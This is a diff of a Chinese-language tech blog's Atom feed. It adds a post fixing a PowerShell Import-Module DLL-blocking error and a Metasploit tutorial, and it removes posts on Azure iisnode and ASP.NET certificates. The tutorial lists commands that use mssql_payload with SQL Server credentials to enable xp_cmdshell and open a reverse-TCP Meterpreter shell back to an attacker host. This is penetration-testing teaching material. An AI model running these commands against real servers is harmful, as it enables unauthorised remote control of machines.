@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://rainmakerho.github.io/"/>
-  <updated>2022-07-05T01:35:38.344Z</updated>
+  <updated>2022-07-05T09:40:29.580Z</updated>
   <id>https://rainmakerho.github.io/</id>
   
   <author>
@@ -15,6 +15,64 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Import-Module 出現 Could not load file or assembly or one of its dependencies. Operation is not supported. 0x80131515 錯誤</title>
+    <link href="https://rainmakerho.github.io/2022/07/05/ps-import-module-0x80131515/"/>
+    <id>https://rainmakerho.github.io/2022/07/05/ps-import-module-0x80131515/</id>
+    <published>2022-07-05T09:18:59.000Z</published>
+    <updated>2022-07-05T09:40:29.580Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天要將 VMDK 轉到 VHD 時，從網路下載 <a href="https://1drv.ms/u/s!Amctqf6I8YYKj_0kR_iru8F0-9CBGg?e=FJzCxA" target="_blank" rel="noopener">Microsoft Virtual Machine Converter 3.0</a> Zip 檔案。<br>下載解壓縮後，開啟 PowerShell 執行 <code>Import-Module</code> ，卻出現 <strong>Import-Module : Could not load file or assembly ‘file:///C:\Program Files\Microsoft Virtual Machine Converter\MvmcCmdlet.dll’ or one of its dependencies. Operation is not supported. (Exception from HRESULT: 0x80131515)</strong> 的錯誤。</p><h3 id="解決方式"><a href="#解決方式" class="headerlink" title="解決方式"></a>解決方式</h3><p>查看 C:\Program Files\Microsoft Virtual Machine Converter\MvmcCmdlet.dll 內容-&gt;一般，<br>最下面的屬性中，多了一個 <strong>安全性</strong> 的提示，選取 <strong>解除封鎖</strong> 並按下套用的 Button 後，<br>再下 Import-Module 就可以成功匯入了。</p><p>不過，看該目錄的其他 DLL 還是有被封鎖的問題，<br>所以最快的方式就是在 <strong>zip</strong> 檔案內容-&gt;一般，<br>最下面  <strong>安全性</strong> 的提示，選取 <strong>解除封鎖</strong> 並按下套用的 Button 後，<br>再解壓縮就可以了哦。<br><img src="/2022/07/05/ps-import-module-0x80131515/01.png" title="解除封鎖"></p><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://stackoverflow.com/questions/34400546/could-not-load-file-or-assembly-operation-is-not-supported-exception-from-hres" target="_blank" rel="noopener">Could not load file or assembly Operation is not supported. (Exception from HRESULT: 0x80131515)</a><br><a href="https://dotblogs.com.tw/rainmaker/2013/08/29/115826" target="_blank" rel="noopener">Exception from HRESULT: 0x80131515</a><br><a href="https://rainmakerho.github.io/2021/05/06/vmdk-to-vhd-azure/">將 VMDK (VHD) 移轉到 Azure</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;今天要將 VMDK 轉到 VHD 時，從網路下載 &lt;a href=&quot;https://1drv.ms/u/s!Amctqf6I8YYKj_0k
+      
+    
+    </summary>
+    
+    
+      <category term="zip" scheme="https://rainmakerho.github.io/tags/zip/"/>
+    
+      <category term="0x80131515" scheme="https://rainmakerho.github.io/tags/0x80131515/"/>
+    
+      <category term="Import-Module" scheme="https://rainmakerho.github.io/tags/Import-Module/"/>
+    
+      <category term="dll" scheme="https://rainmakerho.github.io/tags/dll/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Metasploit Framework - mssql_payload</title>
+    <link href="https://rainmakerho.github.io/2022/07/05/metasploit-mssql-payload/"/>
+    <id>https://rainmakerho.github.io/2022/07/05/metasploit-mssql-payload/</id>
+    <published>2022-07-05T08:13:26.000Z</published>
+    <updated>2022-07-05T09:09:00.134Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>如果知道某台 SQL Server 的帳/密，<br>可以很容易地透過 Metasploit Framework 的 mssql_payload 模組來測試 SQL Server. </p><h3 id="使用-windows-mssql-mssql-payload"><a href="#使用-windows-mssql-mssql-payload" class="headerlink" title="使用 windows/mssql/mssql_payload"></a>使用 windows/mssql/mssql_payload</h3><p><code>use windows/mssql/mssql_payload</code> 後，預設的 payload 是 <strong>windows/meterpreter/reverse_tcp</strong> (也可以透過 <code>show payloads</code> 來查看選擇要用那一項 payload)。<br>輸入 <code>show options</code> 來查看 Module 及 Payload 需要輸入那些參數，<br><img src="/2022/07/05/metasploit-mssql-payload/01.png" title="use mssql_payload"></p><p>設定要攻擊的 SQL Server ，帳/密 及透過 Payload 連回到 Client 的 IP 及 Port，<br>設定完成後，輸入 <code>run</code> 來進行測試。完整的指令如下，<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use windows/mssql/mssql_payload</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.5.0.4</span><br><span class="line"><span class="built_in">set</span> USERNAME [sqlAccountName]</span><br><span class="line"><span class="built_in">set</span> PASSWORD [sqlAccountPwd]</span><br><span class="line"><span class="built_in">set</span> LHOST [Server 連回來的電腦]</span><br><span class="line"><span class="built_in">set</span> LPORT [Server 連回來的Port]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p><p>註: RHOSTS 為 MSSQL 伺服器<br>註: USERNAME 為 MSSQL 伺服器的帳號<br>註: PASSWORD 為 MSSQL 登入者的密碼<br>註: LHOST 為 要讓 RHOSTS 連回來的 IP<br>註: 如果 SQL Server 的 xp_cmdshell 沒有啟用，會試著將它啟用。<br><img src="/2022/07/05/metasploit-mssql-payload/02.png" title="use mssql_payload"><br><img src="/2022/07/05/metasploit-mssql-payload/03.png" title="mssql_payload 完成"><br>成功的話，會建立並進入到 Meterpreter Session 1 。</p><p>在 <strong>meterpreter</strong> 就可以輸入 <code>sysinfo</code>，<code>getuid</code> 來取得這台機器的一些資訊<br><img src="/2022/07/05/metasploit-mssql-payload/04.png" title="mssql_payload meterpreter"></p><p>如果要暫時離開這個 session 可以輸入 <code>background</code> 或是輸入 Ctrl + Z<br>輸入 <code>sessions</code> 可以查看目前有多少個 session<br><img src="/2022/07/05/metasploit-mssql-payload/06.png" title="sessions CtrlZ"></p><img src="/2022/07/05/metasploit-mssql-payload/05.png" title="sessions background"><p>要進入某個 meterpreter session ，可以輸入 <code>session -i [session number]</code></p><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://www.offensive-security.com/metasploit-unleashed/payloads-mssql/" target="_blank" rel="noopener">PAYLOADS THROUGH MSSQL</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;如果知道某台 SQL Server 的帳/密，&lt;br&gt;可以很容易地透過 Metasploit Framework 的 mssql_paylo
+      
+    
+    </summary>
+    
+    
+      <category term="metasploit" scheme="https://rainmakerho.github.io/tags/metasploit/"/>
+    
+      <category term="mssql_payload" scheme="https://rainmakerho.github.io/tags/mssql-payload/"/>
+    
+      <category term="xp_cmdshell" scheme="https://rainmakerho.github.io/tags/xp-cmdshell/"/>
+    
+      <category term="mssql" scheme="https://rainmakerho.github.io/tags/mssql/"/>
+    
+  </entry>
   
   <entry>
     <title>Metasploit Framework - TCP Port Scan</title>
@@ -592,72 +650,6 @@
       <category term="Char.IsSurrogatePair" scheme="https://rainmakerho.github.io/tags/Char-IsSurrogatePair/"/>
     
       <category term="Char.ConvertToUtf32" scheme="https://rainmakerho.github.io/tags/Char-ConvertToUtf32/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>azure nodejs webapp The page cannot be displayed because an internal server error has occurred.</title>
-    <link href="https://rainmakerho.github.io/2022/03/29/azure-webapp-nodejs-internal-server-error/"/>
-    <id>https://rainmakerho.github.io/2022/03/29/azure-webapp-nodejs-internal-server-error/</id>
-    <published>2022-03-29T01:40:25.000Z</published>
-    <updated>2022-03-29T02:49:53.037Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h3><p>最近將 NodeJS 的程式部署到 Azrue WebApp (windows) 之後，<br>去瀏覽網頁一看，居然顯示以下的錯誤，</p><blockquote><p>The page cannot be displayed because an internal server error has occurred.</p></blockquote><p>原本發生錯誤會寫到 iisnode 目錄之中的 log 也沒有寫，<br>透過 <strong>App Service Editor</strong> 查看 WebApp 的 Output 也都沒有任何東西。</p><h3 id="研究與解決"><a href="#研究與解決" class="headerlink" title="研究與解決"></a>研究與解決</h3><p>原本沒問題的，現在有問題，那應該是有什麼異動吧。<br>所以就先檢查 WebApp 的 Configuration 中的 <strong>WEBSITE_NODE_DEFAULT_VERSION</strong> 版本是否有在現在 Azure 所 Support 的 Node Runtime 之中。</p><blockquote><p>可以連到 https://[你的webapp名稱].scm.azurewebsites.net/api/diagnostics/runtime 查看，</p></blockquote><p>我將設定值改成 12.15.0 ，再執行還是一樣的錯誤。<br>再來就是測試一下 web.config ，於是拿 <a href="https://github.com/rainmakerho/offline_dl/blob/master/web.config" target="_blank" rel="noopener">沒問題的web.config</a> 更新上去，<br>再執行程式，居然好了。 那問題就是出在 web.config 上面。</p><p>最後發現是因為 web.config 中，在 rewrite 區段中，有加入 <strong>allowedServerVariables</strong> 的區段，導致 WebApp 直接錯誤。<br>原本的 web.config 如下，<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.web</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">httpCookies</span> <span class="attr">httpOnlyCookies</span>=<span class="string">"true"</span> <span class="attr">requireSSL</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.web</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">webSocket</span> <span class="attr">enabled</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">httpProtocol</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">customHeaders</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">"Strict-Transport-Security"</span> <span class="attr">value</span>=<span class="string">"max-age=31536000; includeSubDomains"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">customHeaders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">httpProtocol</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">handlers</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">"nodejs"</span> <span class="attr">path</span>=<span class="string">"*.js"</span> <span class="attr">verb</span>=<span class="string">"*"</span> <span class="attr">modules</span>=<span class="string">"iisnode"</span> <span class="attr">resourceType</span>=<span class="string">"File"</span> <span class="attr">requireAccess</span>=<span class="string">"Script"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handlers</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">rewrite</span>&gt;</span>    </span><br><span class="line">            <span class="tag">&lt;<span class="name">allowedServerVariables</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">                    ● 此設定是用來解決在iisnode上URL Encode的問題</span></span><br><span class="line"><span class="comment">                    ● 另外，需要ApplicationHost.config的將allowedServerVariables的overrideModeDefault改成Allow</span></span><br><span class="line"><span class="comment">                    ● 詳細設定請參考下面連結</span></span><br><span class="line"><span class="comment">                    [github issue: https://github.com/tjanczuk/iisnode/issues/217]</span></span><br><span class="line"><span class="comment">                --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">"HTTP_X_ORIGINAL_URL"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">"UNENCODED_URL"</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">                    ● 此設定是用來解決在 iisnode 上 Firefox Websocket 問題</span></span><br><span class="line"><span class="comment">                    ● 詳細設定請參考下面連結</span></span><br><span class="line"><span class="comment">                    [github issue: https://github.com/tjanczuk/iisnode/issues/497]</span></span><br><span class="line"><span class="comment">                --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">"HTTP_CONNECTION"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">allowedServerVariables</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rules</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">"all"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">match</span> <span class="attr">url</span>=<span class="string">"/*"</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">action</span> <span class="attr">type</span>=<span class="string">"Rewrite"</span> <span class="attr">url</span>=<span class="string">"index.js"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">"Firefox_Websocket"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">match</span> <span class="attr">url</span>=<span class="string">"stream"</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">action</span> <span class="attr">type</span>=<span class="string">"Rewrite"</span> <span class="attr">url</span>=<span class="string">"index.js"</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">conditions</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">add</span> <span class="attr">input</span>=<span class="string">"&#123;HTTP_CONNECTION&#125;"</span> <span class="attr">pattern</span>=<span class="string">"keep-alive, Upgrade"</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">add</span> <span class="attr">input</span>=<span class="string">"&#123;HTTP_UPGRADE&#125;"</span> <span class="attr">pattern</span>=<span class="string">"websocket"</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">conditions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">serverVariables</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">set</span> <span class="attr">name</span>=<span class="string">"HTTP_CONNECTION"</span> <span class="attr">value</span>=<span class="string">"Upgrade"</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">serverVariables</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rules</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rewrite</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- (node_env: "development" (開發), "production" (產品)) --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iisnode</span> <span class="attr">node_env</span>=<span class="string">"PRODUCTION"</span> <span class="attr">nodeProcessCountPerApplication</span>=<span class="string">"1"</span> <span class="attr">maxConcurrentRequestsPerProcess</span>=<span class="string">"1024"</span> <span class="attr">maxNamedPipeConnectionRetry</span>=<span class="string">"100"</span> <span class="attr">namedPipeConnectionRetryDelay</span>=<span class="string">"250"</span> <span class="attr">maxNamedPipeConnectionPoolSize</span>=<span class="string">"512"</span> <span class="attr">maxNamedPipePooledConnectionAge</span>=<span class="string">"30000"</span> <span class="attr">asyncCompletionThreadCount</span>=<span class="string">"0"</span> <span class="attr">initialRequestBufferSize</span>=<span class="string">"4096"</span> <span class="attr">maxRequestBufferSize</span>=<span class="string">"65536"</span> <span class="attr">uncFileChangesPollingInterval</span>=<span class="string">"5000"</span> <span class="attr">gracefulShutdownTimeout</span>=<span class="string">"60000"</span> <span class="attr">loggingEnabled</span>=<span class="string">"true"</span> <span class="attr">logDirectory</span>=<span class="string">"iisnode"</span> <span class="attr">debuggingEnabled</span>=<span class="string">"true"</span> <span class="attr">debugHeaderEnabled</span>=<span class="string">"false"</span> <span class="attr">debuggerPortRange</span>=<span class="string">"5058-6058"</span> <span class="attr">debuggerPathSegment</span>=<span class="string">"debug"</span> <span class="attr">maxLogFileSizeInKB</span>=<span class="string">"128"</span> <span class="attr">maxTotalLogFileSizeInKB</span>=<span class="string">"1024"</span> <span class="attr">maxLogFiles</span>=<span class="string">"20"</span> <span class="attr">devErrorsEnabled</span>=<span class="string">"true"</span> <span class="attr">flushResponse</span>=<span class="string">"false"</span> <span class="attr">enableXFF</span>=<span class="string">"false"</span> <span class="attr">promoteServerVars</span>=<span class="string">""</span> <span class="attr">configOverrides</span>=<span class="string">"iisnode.yml"</span> <span class="attr">watchedFiles</span>=<span class="string">"web.config;*.js"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>目前就先將該區段移除 。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;問題&quot;&gt;&lt;a href=&quot;#問題&quot; class=&quot;headerlink&quot; title=&quot;問題&quot;&gt;&lt;/a&gt;問題&lt;/h3&gt;&lt;p&gt;最近將 NodeJS 的程式部署到 Azrue WebApp (windows) 之後，&lt;br&gt;去瀏覽網頁一看，居然顯示以下的錯誤，&lt;/p&gt;
-      
-    
-    </summary>
-    
-    
-      <category term="node" scheme="https://rainmakerho.github.io/tags/node/"/>
-    
-      <category term="iisnode" scheme="https://rainmakerho.github.io/tags/iisnode/"/>
-    
-      <category term="nodejs" scheme="https://rainmakerho.github.io/tags/nodejs/"/>
-    
-      <category term="windows" scheme="https://rainmakerho.github.io/tags/windows/"/>
-    
-      <category term="azure" scheme="https://rainmakerho.github.io/tags/azure/"/>
-    
-      <category term="webapp" scheme="https://rainmakerho.github.io/tags/webapp/"/>
-    
-      <category term="internal server error" scheme="https://rainmakerho.github.io/tags/internal-server-error/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Microsoft Visual Studio 無法將憑證新增至受信任的根憑證存放區 - 無法信任憑證</title>
-    <link href="https://rainmakerho.github.io/2022/03/22/visual-studio-adding-certificate-to-trusted-root-failed/"/>
-    <id>https://rainmakerho.github.io/2022/03/22/visual-studio-adding-certificate-to-trusted-root-failed/</id>
-    <published>2022-03-22T14:35:35.000Z</published>
-    <updated>2022-03-22T15:24:52.041Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h3><p>今天開啟 Visual Studio Web 專案執行時，先是提示「要信任 ASP.NET Core SSL 憑證嗎?」，按下「是」後，卻噴「無法信任憑證」的錯誤，<br><img src="/2022/03/22/visual-studio-adding-certificate-to-trusted-root-failed/01.png" title="要信任 ASP.NET Core SSL 憑證嗎?"></p><img src="/2022/03/22/visual-studio-adding-certificate-to-trusted-root-failed/02.png" title="無法將憑證新增至受信任的根憑證存放區"><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>開啟「管理電腦憑證」，在<strong>憑證-本機電腦</strong>的 <strong>個人/憑證</strong> 中有一個 <strong>localhost</strong> 的憑證，查看它的詳細資料中憑證指紋與Browser的並不相同。</p><blockquote><p>註:如果 Browser 查看憑證內容中的 憑證指紋與 個人/憑證 中有的 <strong>localhost</strong> 相同，則可以將它移到 <strong>受信任的根憑證授權單位/憑證</strong> 之中。</p></blockquote><p>所以參考 <a href="https://docs.microsoft.com/en-us/dotnet/core/additional-tools/self-signed-certificates-guide" target="_blank" rel="noopener">Generate self-signed certificates with the .NET CLI</a> 重新建立一個 ASP.NET Core 的自簽憑證，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dotnet dev-certs https -ep $env:USERPROFILE\.aspnet\https\aspnetapp.pfx -p 你的憑證pwd</span><br></pre></td></tr></table></figure><p>並將它放到 <strong>受信任的根憑證授權單位/憑證</strong> 之中，</p><img src="/2022/03/22/visual-studio-adding-certificate-to-trusted-root-failed/03.png" title="受信任的根憑證授權單位/憑證"><p>再重新開啟 Visual Studio Web 專案，執行 Debug 就正常了。</p><h3 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h3><p><a href="https://stackoverflow.com/questions/47413183/visual-studio-2017-gives-adding-the-certificate-to-the-trusted-root-certificate" target="_blank" rel="noopener">Visual Studio 2017 gives ‘Adding the Certificate to The Trusted Root Certificates store failed with the following Errror’</a><br><a href="https://docs.microsoft.com/en-us/dotnet/core/additional-tools/self-signed-certificates-guide" target="_blank" rel="noopener">Generate self-signed certificates with the .NET CLI</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;問題&quot;&gt;&lt;a href=&quot;#問題&quot; class=&quot;headerlink&quot; title=&quot;問題&quot;&gt;&lt;/a&gt;問題&lt;/h3&gt;&lt;p&gt;今天開啟 Visual Studio Web 專案執行時，先是提示「要信任 ASP.NET Core SSL 憑證嗎?」，按下「是」後，卻噴
-      
-    
-    </summary>
-    
-    
-      <category term="Microsoft Visual Studio" scheme="https://rainmakerho.github.io/tags/Microsoft-Visual-Studio/"/>
-    
-      <category term="無法將憑證新增至受信任的根憑證存放區" scheme="https://rainmakerho.github.io/tags/%E7%84%A1%E6%B3%95%E5%B0%87%E6%86%91%E8%AD%89%E6%96%B0%E5%A2%9E%E8%87%B3%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%9A%84%E6%A0%B9%E6%86%91%E8%AD%89%E5%AD%98%E6%94%BE%E5%8D%80/"/>
-    
-      <category term="Adding the certificate to the Trusted Root Certificates store failed with the following error" scheme="https://rainmakerho.github.io/tags/Adding-the-certificate-to-the-Trusted-Root-Certificates-store-failed-with-the-following-error/"/>
-    
-      <category term="Access is denied" scheme="https://rainmakerho.github.io/tags/Access-is-denied/"/>
-    
-      <category term="無法信任憑證" scheme="https://rainmakerho.github.io/tags/%E7%84%A1%E6%B3%95%E4%BF%A1%E4%BB%BB%E6%86%91%E8%AD%89/"/>
     
   </entry>
   
